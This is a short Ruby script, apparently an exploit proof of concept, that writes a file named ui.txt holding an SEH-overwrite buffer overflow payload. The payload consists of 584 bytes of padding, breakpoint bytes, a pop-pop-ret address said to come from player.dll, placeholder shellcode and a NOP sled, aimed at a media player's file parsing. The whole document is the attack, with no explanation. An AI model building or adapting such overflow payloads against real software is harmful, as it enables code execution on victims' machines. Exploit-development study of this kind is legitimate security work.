#!/usr/bin/env ruby

junk = "A" * 584

nSEH = "\xcc" * 4
SEH = "\x12\xE8\x01\x10" # Memory address 0x1001E812 #pop pop ret from player.dll

shellcode = "1ABCDEFGHIJKLM2ABCDEFGHIJKLM3ABCDEFGHIJKLM"

junk2 = "\x90" * 1000

exploit = junk + nSEH + SEH + shellcode + junk2

file = "ui.txt"

File.open(file, 'w') {|f| f.write(exploit)}